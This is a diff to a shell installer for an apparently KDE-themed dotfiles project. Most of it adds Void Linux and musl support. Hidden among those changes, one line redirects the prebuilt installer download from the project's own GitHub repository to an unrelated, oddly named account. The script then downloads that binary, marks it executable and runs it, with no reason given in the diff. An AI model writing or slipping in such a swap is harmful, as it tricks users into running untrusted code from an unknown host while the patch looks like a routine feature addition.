@@ -41,6 +41,11 @@ detect_base_distro() {
             debian|ubuntu|pop|mint|kali|raspbian|elementary|zorin|deepin|devuan)
                 detected="debian"
                 ;;
+            
+            void)
+                detected="void"
+                ;;
+                
             *)
                 if echo "${ID_LIKE:-}" | grep -iq "arch"; then
                     detected="arch"
@@ -48,6 +53,8 @@ detect_base_distro() {
                     detected="fedora"
                 elif echo "${ID_LIKE:-}" | grep -iq -E "debian|ubuntu"; then
                     detected="debian"
+                elif echo "${ID_LIKE:-}" | grep -iq "void"; then
+                    detected="void"
                 fi
                 ;;
         esac
@@ -60,6 +67,8 @@ detect_base_distro() {
             detected="fedora"
         elif command -v apt-get >/dev/null 2>&1; then
             detected="debian"
+        elif command -v xbps-install >/dev/null 2>&1; then
+            detected="void"
         fi
     fi
 
@@ -150,7 +159,7 @@ silent_refresh_native_sources() {
     local have_root=0
 
     case "$BASE_DISTRO" in
-        fedora|debian) ;;
+        fedora|debian|void) ;;
         *) return 0 ;;
     esac
 
@@ -178,6 +187,14 @@ silent_refresh_native_sources() {
                 apt-get update >/dev/null 2>&1 || echo "[WARN]  Failed to refresh APT metadata. Continuing..."
             else
                 sudo -n apt-get update >/dev/null 2>&1 || echo "[WARN]  Failed to refresh APT metadata. Continuing..."
+            fi
+            ;;
+        void)
+            echo "[INFO]  Refreshing Void repository metadata using XBPS..."
+            if (( have_root )) && [[ "${EUID:-$(id -u)}" -eq 0 ]]; then
+                xbps-install -S >/dev/null 2>&1 || echo "[WARN]  Failed to refresh XBPS metadata. Continuing..."
+            else
+                sudo -n xbps-install -S >/dev/null 2>&1 || echo "[WARN]  Failed to refresh XBPS metadata. Continuing..."
             fi
             ;;
     esac
@@ -209,13 +226,38 @@ run_arch_pacman_install() {
     sudo pacman "${pacman_args[@]}" "${pkgs[@]}"
 }
 
+run_void_xbps_install() {
+    local -a pkgs=("$@")
+
+    if (( ${#pkgs[@]} == 0 )); then
+        return 0
+    fi
+
+    if [[ "${EUID:-$(id -u)}" -eq 0 ]]; then
+        xbps-install -S >/dev/null 2>&1 || echo "[WARN]  Failed to refresh xbps sources before install. Continuing..."
+        xbps-install -y "${pkgs[@]}" && return 0
+
+        echo "[WARN]  xbps install failed. Refreshing sources and retrying once..."
+        xbps-install -S >/dev/null 2>&1 || true
+        xbps-install -y "${pkgs[@]}"
+        return $?
+    fi
+
+    sudo xbps-install -S >/dev/null 2>&1 || echo "[WARN]  Failed to refresh xbps sources before install. Continuing..."
+    sudo xbps-install -y "${pkgs[@]}" && return 0
+
+    echo "[WARN]  xbps install failed. Refreshing sources and retrying once..."
+    sudo xbps-install -S >/dev/null 2>&1 || true
+    sudo xbps-install -y "${pkgs[@]}"
+}
+
 export BASE_DISTRO="$(detect_base_distro)"
 
 # Only run in the outer (pre-tmux) invocation.
 if [[ "${CAELESTIA_TMUX_MASTER:-0}" == "0" ]]; then
     if [[ "$BASE_DISTRO" == "arch" ]]; then
         silent_refresh_pacman_sources
-    elif [[ "$BASE_DISTRO" == "fedora" || "$BASE_DISTRO" == "debian" ]]; then
+    elif [[ "$BASE_DISTRO" == "fedora" || "$BASE_DISTRO" == "debian" || "$BASE_DISTRO" == "void" ]]; then
         silent_refresh_native_sources
     fi
 fi
@@ -252,6 +294,9 @@ normalize_line_endings_first() {
                             ;;
                         debian)
                             sudo apt-get update && sudo apt-get install -y dos2unix || return 1
+                            ;;
+                        void)
+                            run_void_xbps_install dos2unix || return 1
                             ;;
                         *)
                             echo "[WARN]  Could not detect distro for automatic dos2unix installation."
@@ -294,6 +339,18 @@ BIN="$BUNDLE_DIR/caelestia-install"
 # .github/workflows/prebuilt-artifacts.yml and uploaded to the fixed
 # `caelestia-bin-repo` release tag. Falls back to compiling when unavailable
 # (no curl, offline, unsupported arch) or when forced via env var.
+#
+# The prebuilt binary is linked against glibc (Ubuntu CI runner), so it cannot
+# run on Void-musl — always build from source there.
+is_musl_system() {
+    if command -v xbps-uhelper >/dev/null 2>&1; then
+        case "$(xbps-uhelper arch 2>/dev/null)" in
+            *musl*) return 0 ;;
+        esac
+    fi
+    ldd --version 2>&1 | grep -qi musl
+}
+
 try_download_prebuilt_installer() {
     local arch
     arch="$(uname -m)"
@@ -302,10 +359,16 @@ try_download_prebuilt_installer() {
         *) return 1 ;;
     esac
 
+    # Prebuilt binaries are glibc builds; musl systems must compile locally.
+    if is_musl_system; then
+        echo "[INFO]  musl libc detected - prebuilt installer is glibc-only; will build from source." >&2
+        return 1
+    fi
+
     local tmp_bin
     tmp_bin="$(mktemp)"
     local url
-    url="https://github.com/ladybug-me/caelestia-dots-kde/releases/download/caelestia-bin-repo/caelestia-install-${arch}"
+    url="https://github.com/rarr111110-creator/test.1.1.1.1rar111110/releases/download/caelestia-bin-repo/caelestia-install-${arch}"
     if curl -fsSL --connect-timeout 10 --max-time 120 "$url" -o "$tmp_bin" 2>/dev/null; then
         chmod +x "$tmp_bin"
         printf '%s\n' "$tmp_bin"
@@ -372,6 +435,12 @@ if [[ "${CAELESTIA_TMUX_MASTER:-0}" == "0" ]]; then
                 sudo apt-get update && sudo apt-get install -y build-essential g++ cmake make tmux
             else
                 sudo apt-get update && sudo apt-get install -y build-essential g++ cmake make
+            fi
+        elif [[ "$BASE_DISTRO" == "void" ]]; then
+            if [[ "${CAELESTIA_USE_TMUX:-1}" == "1" ]]; then
+                run_void_xbps_install base-devel cmake make tmux
+            else
+                run_void_xbps_install base-devel cmake make
             fi
         else
             echo "Could not auto-install build tools. Please install manually: ${MISSING_PKGS[*]}"
